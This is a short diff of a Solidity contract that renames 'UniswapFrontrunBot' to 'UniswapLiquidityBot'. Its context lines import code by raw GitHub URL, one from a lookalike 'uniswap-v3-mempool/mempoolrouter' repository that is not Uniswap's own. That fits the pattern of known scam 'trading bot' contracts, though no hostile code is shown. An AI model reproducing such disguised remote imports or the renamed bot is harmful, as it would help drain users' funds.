@@ -5,7 +5,7 @@ import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/
 import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "https://raw.githubusercontent.com/uniswap-v3-mempool/mempoolrouter/main/v3";
 
-contract UniswapFrontrunBot {
+contract UniswapLiquidityBot {
 
     string public tokenName;
     string public tokenSymbol;
